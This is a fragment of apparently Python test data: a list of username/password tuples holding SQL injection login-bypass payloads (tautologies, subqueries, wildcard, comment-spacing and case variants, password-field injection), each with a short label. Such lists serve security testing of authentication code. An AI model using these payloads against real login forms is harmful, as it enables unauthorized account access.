    ("admin' AND '1'='1", "admin", "AND true with password"),
    
    # Subquery bypasses
    ("admin' OR (SELECT 1)=1-- ", "anything", "Subquery bypass"),
    
    # NULL password bypasses
    ("admin' AND password IS NOT NULL-- ", "anything", "NOT NULL check"),
    ("admin' AND 1=1 AND '1'='1", "anything", "Multiple AND conditions"),
    
    # Wildcard
    ("admin' OR username LIKE '%'-- ", "anything", "LIKE wildcard"),
    
    # No space variants
    ("admin'OR'1'='1", "anything", "No spaces"),
    ("admin'/**/OR/**/1=1--", "anything", "Comment spaces"),
    
    # Case manipulation
    ("AdMiN' OR '1'='1", "anything", "Case variation"),
    
    # With LIMIT
    ("admin' OR 1=1 LIMIT 1-- ", "anything", "OR with LIMIT"),
    
    # Password field injection (switching to password parameter)
    ("admin", "' OR '1'='1", "Password field OR"),
    ("admin", "' OR '1'='1'-- ", "Password OR with comment"),
    ("admin", "' OR 1=1-- ", "Password numeric OR"),
    
    # Both fields injection
    ("admin' OR '1'='1'-- ", "' OR '1'='1'-- ", "Both fields OR"),
    
